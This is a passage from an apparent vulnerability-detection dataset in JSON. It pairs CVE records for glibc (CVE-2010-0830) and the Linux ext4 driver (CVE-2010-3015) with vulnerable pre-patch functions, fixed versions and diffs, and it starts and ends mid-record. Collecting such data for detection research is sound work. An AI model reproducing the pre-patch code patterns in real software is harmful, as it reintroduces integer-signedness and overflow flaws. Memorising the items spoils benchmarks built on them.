1; cp >= startp; --cp)\n+\t      long int dist = width - (dest - startp);\n+\t      for (char *cp = dest - 1; cp >= startp; --cp)\n \t\tcp[dist] = cp[0];\n \n \t      dest += dist;",
        "diff_line_info": {
            "deleted_lines": [
                "      int width;",
                "\t      width *= 10;",
                "\t      width += to_digit (*fmt);",
                "\t  if (dest + width >= s + maxsize)",
                "\t    ",
                "\t      int dist = width - (dest - startp);",
                "\t      char *cp;",
                "\t      for (cp = dest - 1; cp >= startp; --cp)"
            ],
            "added_lines": [
                "      long int width;",
                "\t      int val = to_digit (*fmt);",
                "",
                "\t      if (width > LONG_MAX / 10",
                "\t\t  || (width == LONG_MAX && val > LONG_MAX % 10))",
                "\t\t{",
                "\t\t  __set_errno (E2BIG);",
                "\t\t  return -1;",
                "\t\t}",
                "",
                "\t      width = width * 10 + val;",
                "\t  if (width >= maxsize - (dest - s))",
                "",
                "\t      long int dist = width - (dest - startp);",
                "\t      for (char *cp = dest - 1; cp >= startp; --cp)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-0830",
        "func_name": "glibc/elf_get_dynamic_info",
        "description": "Integer signedness error in the elf_get_dynamic_info function in elf/dynamic-link.h in ld.so in the GNU C Library (aka glibc or libc6) 2.0.1 through 2.11.1, when the --verify option is used, allows user-assisted remote attackers to execute arbitrary code via a crafted ELF program with a negative value for a certain d_tag structure member in the ELF header.",
        "git_url": "http://sourceware.org/git/?p=glibc.git;a=commit;h=db07e962b6ea963dbb345439f6ab9b0cf74d87c5",
        "commit_title": "",
        "commit_text": "Use correct type when casting d_tag. ",
        "func_before": "static\n#else\nauto\n#endif\ninline void __attribute__ ((unused, always_inline))\nelf_get_dynamic_info (struct link_map *l, ElfW(Dyn) *temp)\n{\n  ElfW(Dyn) *dyn = l->l_ld;\n  ElfW(Dyn) **info;\n\n#ifndef RTLD_BOOTSTRAP\n  if (dyn == NULL)\n    return;\n#endif\n\n  info = l->l_info;\n\n  while (dyn->d_tag != DT_NULL)\n    {\n      if ((Elf32_Word) dyn->d_tag < DT_NUM)\n\tinfo[dyn->d_tag] = dyn;\n      else if (dyn->d_tag >= DT_LOPROC &&\n\t       dyn->d_tag < DT_LOPROC + DT_THISPROCNUM)\n\tinfo[dyn->d_tag - DT_LOPROC + DT_NUM] = dyn;\n      else if ((Elf32_Word) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)\n\tinfo[VERSYMIDX (dyn->d_tag)] = dyn;\n      else if ((Elf32_Word) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)\n\tinfo[DT_EXTRATAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM] = dyn;\n      else if ((Elf32_Word) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)\n\tinfo[DT_VALTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM + DT_EXTRANUM] = dyn;\n      else if ((Elf32_Word) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)\n\tinfo[DT_ADDRTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM] = dyn;\n      ++dyn;\n    }\n\n#define DL_RO_DYN_TEMP_CNT\t8\n\n#ifndef DL_RO_DYN_SECTION\n  /* Don't adjust .dynamic unnecessarily.  */\n  if (l->l_addr != 0)\n    {\n      ElfW(Addr) l_addr = l->l_addr;\n      int cnt = 0;\n\n# define ADJUST_DYN_INFO(tag) \\\n      do\t\t\t\t\t\t\t\t      \\\n\tif (info[tag] != NULL)\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    if (temp)\t\t\t\t\t\t\t      \\\n\t      {\t\t\t\t\t\t\t\t      \\\n\t\ttemp[cnt].d_tag = info[tag]->d_tag;\t\t\t      \\\n\t\ttemp[cnt].d_un.d_ptr = info[tag]->d_un.d_ptr + l_addr;\t      \\\n\t\tinfo[tag] = temp + cnt++;\t\t\t\t      \\\n\t      }\t\t\t\t\t\t\t\t      \\\n\t    else\t\t\t\t\t\t\t      \\\n\t      info[tag]->d_un.d_ptr += l_addr;\t\t\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n      while (0)\n\n      ADJUST_DYN_INFO (DT_HASH);\n      ADJUST_DYN_INFO (DT_PLTGOT);\n      ADJUST_DYN_INFO (DT_STRTAB);\n      ADJUST_DYN_INFO (DT_SYMTAB);\n# if ! ELF_MACHINE_NO_RELA\n      ADJUST_DYN_INFO (DT_RELA);\n# endif\n# if ! ELF_MACHINE_NO_REL\n      ADJUST_DYN_INFO (DT_REL);\n# endif\n      ADJUST_DYN_INFO (DT_JMPREL);\n      ADJUST_DYN_INFO (VERSYMIDX (DT_VERSYM));\n      ADJUST_DYN_INFO (DT_ADDRTAGIDX (DT_GNU_HASH) + DT_NUM + DT_THISPROCNUM\n\t\t       + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM);\n# undef ADJUST_DYN_INFO\n      assert (cnt <= DL_RO_DYN_TEMP_CNT);\n    }\n#endif\n  if (info[DT_PLTREL] != NULL)\n    {\n#if ELF_MACHINE_NO_RELA\n      assert (info[DT_PLTREL]->d_un.d_val == DT_REL);\n#elif ELF_MACHINE_NO_REL\n      assert (info[DT_PLTREL]->d_un.d_val == DT_RELA);\n#else\n      assert (info[DT_PLTREL]->d_un.d_val == DT_REL\n\t      || info[DT_PLTREL]->d_un.d_val == DT_RELA);\n#endif\n    }\n#if ! ELF_MACHINE_NO_RELA\n  if (info[DT_RELA] != NULL)\n    assert (info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela)));\n# endif\n# if ! ELF_MACHINE_NO_REL\n  if (info[DT_REL] != NULL)\n    assert (info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel)));\n#endif\n#ifdef RTLD_BOOTSTRAP\n  /* Only the bind now flags are allowed.  */\n  assert (info[VERSYMIDX (DT_FLAGS_1)] == NULL\n\t  || info[VERSYMIDX (DT_FLAGS_1)]->d_un.d_val == DF_1_NOW);\n  assert (info[DT_FLAGS] == NULL\n\t  || info[DT_FLAGS]->d_un.d_val == DF_BIND_NOW);\n  /* Flags must not be set for ld.so.  */\n  assert (info[DT_RUNPATH] == NULL);\n  assert (info[DT_RPATH] == NULL);\n#else\n  if (info[DT_FLAGS] != NULL)\n    {\n      /* Flags are used.  Translate to the old form where available.\n\t Since these l_info entries are only tested for NULL pointers it\n\t is ok if they point to the DT_FLAGS entry.  */\n      l->l_flags = info[DT_FLAGS]->d_un.d_val;\n\n      if (l->l_flags & DF_SYMBOLIC)\n\tinfo[DT_SYMBOLIC] = info[DT_FLAGS];\n      if (l->l_flags & DF_TEXTREL)\n\tinfo[DT_TEXTREL] = info[DT_FLAGS];\n      if (l->l_flags & DF_BIND_NOW)\n\tinfo[DT_BIND_NOW] = info[DT_FLAGS];\n    }\n  if (info[VERSYMIDX (DT_FLAGS_1)] != NULL)\n    {\n      l->l_flags_1 = info[VERSYMIDX (DT_FLAGS_1)]->d_un.d_val;\n\n      if (l->l_flags_1 & DF_1_NOW)\n\tinfo[DT_BIND_NOW] = info[VERSYMIDX (DT_FLAGS_1)];\n    }\n  if (info[DT_RUNPATH] != NULL)\n    /* If both RUNPATH and RPATH are given, the latter is ignored.  */\n    info[DT_RPATH] = NULL;\n#endif\n}",
        "func": "static\n#else\nauto\n#endif\ninline void __attribute__ ((unused, always_inline))\nelf_get_dynamic_info (struct link_map *l, ElfW(Dyn) *temp)\n{\n  ElfW(Dyn) *dyn = l->l_ld;\n  ElfW(Dyn) **info;\n#if __ELF_NATIVE_CLASS == 32\n  typedef Elf32_Word d_tag_utype;\n#elif __ELF_NATIVE_CLASS == 64\n  typedef Elf64_Xword d_tag_utype;\n#endif\n\n#ifndef RTLD_BOOTSTRAP\n  if (dyn == NULL)\n    return;\n#endif\n\n  info = l->l_info;\n\n  while (dyn->d_tag != DT_NULL)\n    {\n      if ((d_tag_utype) dyn->d_tag < DT_NUM)\n\tinfo[dyn->d_tag] = dyn;\n      else if (dyn->d_tag >= DT_LOPROC &&\n\t       dyn->d_tag < DT_LOPROC + DT_THISPROCNUM)\n\tinfo[dyn->d_tag - DT_LOPROC + DT_NUM] = dyn;\n      else if ((d_tag_utype) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)\n\tinfo[VERSYMIDX (dyn->d_tag)] = dyn;\n      else if ((d_tag_utype) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)\n\tinfo[DT_EXTRATAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM] = dyn;\n      else if ((d_tag_utype) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)\n\tinfo[DT_VALTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM + DT_EXTRANUM] = dyn;\n      else if ((d_tag_utype) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)\n\tinfo[DT_ADDRTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n\t     + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM] = dyn;\n      ++dyn;\n    }\n\n#define DL_RO_DYN_TEMP_CNT\t8\n\n#ifndef DL_RO_DYN_SECTION\n  /* Don't adjust .dynamic unnecessarily.  */\n  if (l->l_addr != 0)\n    {\n      ElfW(Addr) l_addr = l->l_addr;\n      int cnt = 0;\n\n# define ADJUST_DYN_INFO(tag) \\\n      do\t\t\t\t\t\t\t\t      \\\n\tif (info[tag] != NULL)\t\t\t\t\t\t      \\\n\t  {\t\t\t\t\t\t\t\t      \\\n\t    if (temp)\t\t\t\t\t\t\t      \\\n\t      {\t\t\t\t\t\t\t\t      \\\n\t\ttemp[cnt].d_tag = info[tag]->d_tag;\t\t\t      \\\n\t\ttemp[cnt].d_un.d_ptr = info[tag]->d_un.d_ptr + l_addr;\t      \\\n\t\tinfo[tag] = temp + cnt++;\t\t\t\t      \\\n\t      }\t\t\t\t\t\t\t\t      \\\n\t    else\t\t\t\t\t\t\t      \\\n\t      info[tag]->d_un.d_ptr += l_addr;\t\t\t\t      \\\n\t  }\t\t\t\t\t\t\t\t      \\\n      while (0)\n\n      ADJUST_DYN_INFO (DT_HASH);\n      ADJUST_DYN_INFO (DT_PLTGOT);\n      ADJUST_DYN_INFO (DT_STRTAB);\n      ADJUST_DYN_INFO (DT_SYMTAB);\n# if ! ELF_MACHINE_NO_RELA\n      ADJUST_DYN_INFO (DT_RELA);\n# endif\n# if ! ELF_MACHINE_NO_REL\n      ADJUST_DYN_INFO (DT_REL);\n# endif\n      ADJUST_DYN_INFO (DT_JMPREL);\n      ADJUST_DYN_INFO (VERSYMIDX (DT_VERSYM));\n      ADJUST_DYN_INFO (DT_ADDRTAGIDX (DT_GNU_HASH) + DT_NUM + DT_THISPROCNUM\n\t\t       + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM);\n# undef ADJUST_DYN_INFO\n      assert (cnt <= DL_RO_DYN_TEMP_CNT);\n    }\n#endif\n  if (info[DT_PLTREL] != NULL)\n    {\n#if ELF_MACHINE_NO_RELA\n      assert (info[DT_PLTREL]->d_un.d_val == DT_REL);\n#elif ELF_MACHINE_NO_REL\n      assert (info[DT_PLTREL]->d_un.d_val == DT_RELA);\n#else\n      assert (info[DT_PLTREL]->d_un.d_val == DT_REL\n\t      || info[DT_PLTREL]->d_un.d_val == DT_RELA);\n#endif\n    }\n#if ! ELF_MACHINE_NO_RELA\n  if (info[DT_RELA] != NULL)\n    assert (info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela)));\n# endif\n# if ! ELF_MACHINE_NO_REL\n  if (info[DT_REL] != NULL)\n    assert (info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel)));\n#endif\n#ifdef RTLD_BOOTSTRAP\n  /* Only the bind now flags are allowed.  */\n  assert (info[VERSYMIDX (DT_FLAGS_1)] == NULL\n\t  || info[VERSYMIDX (DT_FLAGS_1)]->d_un.d_val == DF_1_NOW);\n  assert (info[DT_FLAGS] == NULL\n\t  || info[DT_FLAGS]->d_un.d_val == DF_BIND_NOW);\n  /* Flags must not be set for ld.so.  */\n  assert (info[DT_RUNPATH] == NULL);\n  assert (info[DT_RPATH] == NULL);\n#else\n  if (info[DT_FLAGS] != NULL)\n    {\n      /* Flags are used.  Translate to the old form where available.\n\t Since these l_info entries are only tested for NULL pointers it\n\t is ok if they point to the DT_FLAGS entry.  */\n      l->l_flags = info[DT_FLAGS]->d_un.d_val;\n\n      if (l->l_flags & DF_SYMBOLIC)\n\tinfo[DT_SYMBOLIC] = info[DT_FLAGS];\n      if (l->l_flags & DF_TEXTREL)\n\tinfo[DT_TEXTREL] = info[DT_FLAGS];\n      if (l->l_flags & DF_BIND_NOW)\n\tinfo[DT_BIND_NOW] = info[DT_FLAGS];\n    }\n  if (info[VERSYMIDX (DT_FLAGS_1)] != NULL)\n    {\n      l->l_flags_1 = info[VERSYMIDX (DT_FLAGS_1)]->d_un.d_val;\n\n      if (l->l_flags_1 & DF_1_NOW)\n\tinfo[DT_BIND_NOW] = info[VERSYMIDX (DT_FLAGS_1)];\n    }\n  if (info[DT_RUNPATH] != NULL)\n    /* If both RUNPATH and RPATH are given, the latter is ignored.  */\n    info[DT_RPATH] = NULL;\n#endif\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,6 +7,11 @@\n {\n   ElfW(Dyn) *dyn = l->l_ld;\n   ElfW(Dyn) **info;\n+#if __ELF_NATIVE_CLASS == 32\n+  typedef Elf32_Word d_tag_utype;\n+#elif __ELF_NATIVE_CLASS == 64\n+  typedef Elf64_Xword d_tag_utype;\n+#endif\n \n #ifndef RTLD_BOOTSTRAP\n   if (dyn == NULL)\n@@ -17,20 +22,20 @@\n \n   while (dyn->d_tag != DT_NULL)\n     {\n-      if ((Elf32_Word) dyn->d_tag < DT_NUM)\n+      if ((d_tag_utype) dyn->d_tag < DT_NUM)\n \tinfo[dyn->d_tag] = dyn;\n       else if (dyn->d_tag >= DT_LOPROC &&\n \t       dyn->d_tag < DT_LOPROC + DT_THISPROCNUM)\n \tinfo[dyn->d_tag - DT_LOPROC + DT_NUM] = dyn;\n-      else if ((Elf32_Word) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)\n+      else if ((d_tag_utype) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)\n \tinfo[VERSYMIDX (dyn->d_tag)] = dyn;\n-      else if ((Elf32_Word) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)\n+      else if ((d_tag_utype) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)\n \tinfo[DT_EXTRATAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n \t     + DT_VERSIONTAGNUM] = dyn;\n-      else if ((Elf32_Word) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)\n+      else if ((d_tag_utype) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)\n \tinfo[DT_VALTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n \t     + DT_VERSIONTAGNUM + DT_EXTRANUM] = dyn;\n-      else if ((Elf32_Word) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)\n+      else if ((d_tag_utype) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)\n \tinfo[DT_ADDRTAGIDX (dyn->d_tag) + DT_NUM + DT_THISPROCNUM\n \t     + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM] = dyn;\n       ++dyn;",
        "diff_line_info": {
            "deleted_lines": [
                "      if ((Elf32_Word) dyn->d_tag < DT_NUM)",
                "      else if ((Elf32_Word) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)",
                "      else if ((Elf32_Word) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)",
                "      else if ((Elf32_Word) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)",
                "      else if ((Elf32_Word) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)"
            ],
            "added_lines": [
                "#if __ELF_NATIVE_CLASS == 32",
                "  typedef Elf32_Word d_tag_utype;",
                "#elif __ELF_NATIVE_CLASS == 64",
                "  typedef Elf64_Xword d_tag_utype;",
                "#endif",
                "      if ((d_tag_utype) dyn->d_tag < DT_NUM)",
                "      else if ((d_tag_utype) DT_VERSIONTAGIDX (dyn->d_tag) < DT_VERSIONTAGNUM)",
                "      else if ((d_tag_utype) DT_EXTRATAGIDX (dyn->d_tag) < DT_EXTRANUM)",
                "      else if ((d_tag_utype) DT_VALTAGIDX (dyn->d_tag) < DT_VALNUM)",
                "      else if ((d_tag_utype) DT_ADDRTAGIDX (dyn->d_tag) < DT_ADDRNUM)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-3015",
        "func_name": "torvalds/linux/ext4_ext_in_cache",
        "description": "Integer overflow in the ext4_ext_get_blocks function in fs/ext4/extents.c in the Linux kernel before 2.6.34 allows local users to cause a denial of service (BUG and system crash) via a write operation on the last block of a large file, followed by a sync operation.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=731eb1a03a8445cde2cb23ecfb3580c6fa7bb690",
        "commit_title": "There are duplicate macro definitions of in_range() in mballoc.h and",
        "commit_text": "balloc.c.  This consolidates these two definitions into ext4.h, and changes extents.c to use in_range() as well.  Cc: Andreas Dilger <adilger@sun.com> ",
        "func_before": "static int\next4_ext_in_cache(struct inode *inode, ext4_lblk_t block,\n\t\t\tstruct ext4_extent *ex)\n{\n\tstruct ext4_ext_cache *cex;\n\tint ret = EXT4_EXT_CACHE_NO;\n\n\t/* \n\t * We borrow i_block_reservation_lock to protect i_cached_extent\n\t */\n\tspin_lock(&EXT4_I(inode)->i_block_reservation_lock);\n\tcex = &EXT4_I(inode)->i_cached_extent;\n\n\t/* has cache valid data? */\n\tif (cex->ec_type == EXT4_EXT_CACHE_NO)\n\t\tgoto errout;\n\n\tBUG_ON(cex->ec_type != EXT4_EXT_CACHE_GAP &&\n\t\t\tcex->ec_type != EXT4_EXT_CACHE_EXTENT);\n\tif (block >= cex->ec_block && block < cex->ec_block + cex->ec_len) {\n\t\tex->ee_block = cpu_to_le32(cex->ec_block);\n\t\text4_ext_store_pblock(ex, cex->ec_start);\n\t\tex->ee_len = cpu_to_le16(cex->ec_len);\n\t\text_debug(\"%u cached by %u:%u:%llu\\n\",\n\t\t\t\tblock,\n\t\t\t\tcex->ec_block, cex->ec_len, cex->ec_start);\n\t\tret = cex->ec_type;\n\t}\nerrout:\n\tspin_unlock(&EXT4_I(inode)->i_block_reservation_lock);\n\treturn ret;\n}",
        "func": "static int\next4_ext_in_cache(struct inode *inode, ext4_lblk_t block,\n\t\t\tstruct ext4_extent *ex)\n{\n\tstruct ext4_ext_cache *cex;\n\tint ret = EXT4_EXT_CACHE_NO;\n\n\t/* \n\t * We borrow i_block_reservation_lock to protect i_cached_extent\n\t */\n\tspin_lock(&EXT4_I(inode)->i_block_reservation_lock);\n\tcex = &EXT4_I(inode)->i_cached_extent;\n\n\t/* has cache valid data? */\n\tif (cex->ec_type == EXT4_EXT_CACHE_NO)\n\t\tgoto errout;\n\n\tBUG_ON(cex->ec_type != EXT4_EXT_CACHE_GAP &&\n\t\t\tcex->ec_type != EXT4_EXT_CACHE_EXTENT);\n\tif (in_range(block, cex->ec_block, cex->ec_len)) {\n\t\tex->ee_block = cpu_to_le32(cex->ec_block);\n\t\text4_ext_store_pblock(ex, cex->ec_start);\n\t\tex->ee_len = cpu_to_le16(cex->ec_len);\n\t\text_debug(\"%u cached by %u:%u:%llu\\n\",\n\t\t\t\tblock,\n\t\t\t\tcex->ec_block, cex->ec_len, cex->ec_start);\n\t\tret = cex->ec_type;\n\t}\nerrout:\n\tspin_unlock(&EXT4_I(inode)->i_block_reservation_lock);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,7 +17,7 @@\n \n \tBUG_ON(cex->ec_type != EXT4_EXT_CACHE_GAP &&\n \t\t\tcex->ec_type != EXT4_EXT_CACHE_EXTENT);\n-\tif (block >= cex->ec_block && block < cex->ec_block + cex->ec_len) {\n+\tif (in_range(block, cex->ec_block, cex->ec_len)) {\n \t\tex->ee_block = cpu_to_le32(cex->ec_block);\n \t\text4_ext_store_pblock(ex, cex->ec_start);\n \t\tex->ee_len = cpu_to_le16(cex->ec_len);",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (block >= cex->ec_block && block < cex->ec_block + cex->ec_len) {"
            ],
            "added_lines": [
                "\tif (in_range(block, cex->ec_block, cex->ec_len)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-3015",
        "func_name": "torvalds/linux/ext4_ext_get_blocks",
        "description": "Integer overflow in the ext4_ext_get_blocks function in fs/ext4/extents.c in the Linux kernel before 2.6.34 allows local users to cause a denial of service (BUG and system crash) via a write operation on the last block of a large file, followed by a sync operation.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=731eb1a03a8445cde2cb23ecfb3580c6fa7bb690",
        "commit_title": "There are duplicate macro definitions of in_range() in mballoc.h and",
        "commit_text": "balloc.c.  This consolidates these two definitions into ext4.h, and changes extents.c to use in_range() as well.  Cc: Andreas Dilger <adilger@sun.com> ",
        "func_before": "int ext4_ext_get_blocks(handle_t *handle, struct inode *inode,\n\t\t\text4_lblk_t iblock,\n\t\t\tunsigned int max_blocks, struct buffer_head *bh_result,\n\t\t\tint flags)\n{\n\tstruct ext4_ext_path *path = NULL;\n\tstruct ext4_extent_header *eh;\n\tstruct ext4_extent newex, *ex, *last_ex;\n\text4_fsblk_t newblock;\n\tint err = 0, depth, ret, cache_type;\n\tunsigned int allocated = 0;\n\tstruct ext4_allocation_request ar;\n\text4_io_end_t *io = EXT4_I(inode)->cur_aio_dio;\n\n\t__clear_bit(BH_New, &bh_result->b_state);\n\text_debug(\"blocks %u/%u requested for inode %lu\\n\",\n\t\t\tiblock, max_blocks, inode->i_ino);\n\n\t/* check in cache */\n\tcache_type = ext4_ext_in_cache(inode, iblock, &newex);\n\tif (cache_type) {\n\t\tif (cache_type == EXT4_EXT_CACHE_GAP) {\n\t\t\tif ((flags & EXT4_GET_BLOCKS_CREATE) == 0) {\n\t\t\t\t/*\n\t\t\t\t * block isn't allocated yet and\n\t\t\t\t * user doesn't want to allocate it\n\t\t\t\t */\n\t\t\t\tgoto out2;\n\t\t\t}\n\t\t\t/* we should allocate requested block */\n\t\t} else if (cache_type == EXT4_EXT_CACHE_EXTENT) {\n\t\t\t/* block is already allocated */\n\t\t\tnewblock = iblock\n\t\t\t\t   - le32_to_cpu(newex.ee_block)\n\t\t\t\t   + ext_pblock(&newex);\n\t\t\t/* number of remaining blocks in the extent */\n\t\t\tallocated = ext4_ext_get_actual_len(&newex) -\n\t\t\t\t\t(iblock - le32_to_cpu(newex.ee_block));\n\t\t\tgoto out;\n\t\t} else {\n\t\t\tBUG();\n\t\t}\n\t}\n\n\t/* find extent for this block */\n\tpath = ext4_ext_find_extent(inode, iblock, NULL);\n\tif (IS_ERR(path)) {\n\t\terr = PTR_ERR(path);\n\t\tpath = NULL;\n\t\tgoto out2;\n\t}\n\n\tdepth = ext_depth(inode);\n\n\t/*\n\t * consistent leaf must not be empty;\n\t * this situation is possible, though, _during_ tree modification;\n\t * this is why assert can't be put in ext4_ext_find_extent()\n\t */\n\tif (unlikely(path[depth].p_ext == NULL && depth != 0)) {\n\t\tEXT4_ERROR_INODE(inode, \"bad extent address \"\n\t\t\t\t \"iblock: %d, depth: %d pblock %lld\",\n\t\t\t\t iblock, depth, path[depth].p_block);\n\t\terr = -EIO;\n\t\tgoto out2;\n\t}\n\teh = path[depth].p_hdr;\n\n\tex = path[depth].p_ext;\n\tif (ex) {\n\t\text4_lblk_t ee_block = le32_to_cpu(ex->ee_block);\n\t\text4_fsblk_t ee_start = ext_pblock(ex);\n\t\tunsigned short ee_len;\n\n\t\t/*\n\t\t * Uninitialized extents are treated as holes, except that\n\t\t * we split out initialized portions during a write.\n\t\t */\n\t\tee_len = ext4_ext_get_actual_len(ex);\n\t\t/* if found extent covers block, simply return it */\n\t\tif (iblock >= ee_block && iblock < ee_block + ee_len) {\n\t\t\tnewblock = iblock - ee_block + ee_start;\n\t\t\t/* number of remaining blocks in the extent */\n\t\t\tallocated = ee_len - (iblock - ee_block);\n\t\t\text_debug(\"%u fit into %u:%d -> %llu\\n\", iblock,\n\t\t\t\t\tee_block, ee_len, newblock);\n\n\t\t\t/* Do not put uninitialized extent in the cache */\n\t\t\tif (!ext4_ext_is_uninitialized(ex)) {\n\t\t\t\text4_ext_put_in_cache(inode, ee_block,\n\t\t\t\t\t\t\tee_len, ee_start,\n\t\t\t\t\t\t\tEXT4_EXT_CACHE_EXTENT);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tret = ext4_ext_handle_uninitialized_extents(handle,\n\t\t\t\t\tinode, iblock, max_blocks, path,\n\t\t\t\t\tflags, allocated, bh_result, newblock);\n\t\t\treturn ret;\n\t\t}\n\t}\n\n\t/*\n\t * requested block isn't allocated yet;\n\t * we couldn't try to create block if create flag is zero\n\t */\n\tif ((flags & EXT4_GET_BLOCKS_CREATE) == 0) {\n\t\t/*\n\t\t * put just found gap into cache to speed up\n\t\t * subsequent requests\n\t\t */\n\t\text4_ext_put_gap_in_cache(inode, path, iblock);\n\t\tgoto out2;\n\t}\n\t/*\n\t * Okay, we need to do block allocation.\n\t */\n\n\t/* find neighbour allocated blocks */\n\tar.lleft = iblock;\n\terr = ext4_ext_search_left(inode, path, &ar.lleft, &ar.pleft);\n\tif (err)\n\t\tgoto out2;\n\tar.lright = iblock;\n\terr = ext4_ext_search_right(inode, path, &ar.lright, &ar.pright);\n\tif (err)\n\t\tgoto out2;\n\n\t/*\n\t * See if request is beyond maximum number of blocks we can have in\n\t * a single extent. For an initialized extent this limit is\n\t * EXT_INIT_MAX_LEN and for an uninitialized extent this limit is\n\t * EXT_UNINIT_MAX_LEN.\n\t */\n\tif (max_blocks > EXT_INIT_MAX_LEN &&\n\t    !(flags & EXT4_GET_BLOCKS_UNINIT_EXT))\n\t\tmax_blocks = EXT_INIT_MAX_LEN;\n\telse if (max_blocks > EXT_UNINIT_MAX_LEN &&\n\t\t (flags & EXT4_GET_BLOCKS_UNINIT_EXT))\n\t\tmax_blocks = EXT_UNINIT_MAX_LEN;\n\n\t/* Check if we can really insert (iblock)::(iblock+max_blocks) extent */\n\tnewex.ee_block = cpu_to_le32(iblock);\n\tnewex.ee_len = cpu_to_le16(max_blocks);\n\terr = ext4_ext_check_overlap(inode, &newex, path);\n\tif (err)\n\t\tallocated = ext4_ext_get_actual_len(&newex);\n\telse\n\t\tallocated = max_blocks;\n\n\t/* allocate new block */\n\tar.inode = inode;\n\tar.goal = ext4_ext_find_goal(inode, path, iblock);\n\tar.logical = iblock;\n\tar.len = allocated;\n\tif (S_ISREG(inode->i_mode))\n\t\tar.flags = EXT4_MB_HINT_DATA;\n\telse\n\t\t/* disable in-core preallocation for non-regular files */\n\t\tar.flags = 0;\n\tnewblock = ext4_mb_new_blocks(handle, &ar, &err);\n\tif (!newblock)\n\t\tgoto out2;\n\text_debug(\"allocate new block: goal %llu, found %llu/%u\\n\",\n\t\t  ar.goal, newblock, allocated);\n\n\t/* try to insert new extent into found leaf and return */\n\text4_ext_store_pblock(&newex, newblock);\n\tnewex.ee_len = cpu_to_le16(ar.len);\n\t/* Mark uninitialized */\n\tif (flags & EXT4_GET_BLOCKS_UNINIT_EXT){\n\t\text4_ext_mark_uninitialized(&newex);\n\t\t/*\n\t\t * io_end structure was created for every IO write to an\n\t\t * uninitialized extent. To avoid unecessary conversion,\n\t\t * here we flag the IO that really needs the conversion.\n\t\t * For non asycn direct IO case, flag the inode state\n\t\t * that we need to perform convertion when IO is done.\n\t\t */\n\t\tif ((flags & EXT4_GET_BLOCKS_PRE_IO)) {\n\t\t\tif (io)\n\t\t\t\tio->flag = EXT4_IO_UNWRITTEN;\n\t\t\telse\n\t\t\t\text4_set_inode_state(inode,\n\t\t\t\t\t\t     EXT4_STATE_DIO_UNWRITTEN);\n\t\t}\n\t\tif (ext4_should_dioread_nolock(inode))\n\t\t\tset_buffer_uninit(bh_result);\n\t}\n\n\tif (unlikely(EXT4_I(inode)->i_flags & EXT4_EOFBLOCKS_FL)) {\n\t\tif (unlikely(!eh->eh_entries)) {\n\t\t\tEXT4_ERROR_INODE(inode,\n\t\t\t\t\t \"eh->eh_entries == 0 ee_block %d\",\n\t\t\t\t\t ex->ee_block);\n\t\t\terr = -EIO;\n\t\t\tgoto out2;\n\t\t}\n\t\tlast_ex = EXT_LAST_EXTENT(eh);\n\t\tif (iblock + ar.len > le32_to_cpu(last_ex->ee_block)\n\t\t    + ext4_ext_get_actual_len(last_ex))\n\t\t\tEXT4_I(inode)->i_flags &= ~EXT4_EOFBLOCKS_FL;\n\t}\n\terr = ext4_ext_insert_extent(handle, inode, path, &newex, flags);\n\tif (err) {\n\t\t/* free data blocks we just allocated */\n\t\t/* not a good idea to call discard here directly,\n\t\t * but otherwise we'd need to call it every free() */\n\t\text4_discard_preallocations(inode);\n\t\text4_free_blocks(handle, inode, 0, ext_pblock(&newex),\n\t\t\t\t ext4_ext_get_actual_len(&newex), 0);\n\t\tgoto out2;\n\t}\n\n\t/* previous routine could use block we allocated */\n\tnewblock = 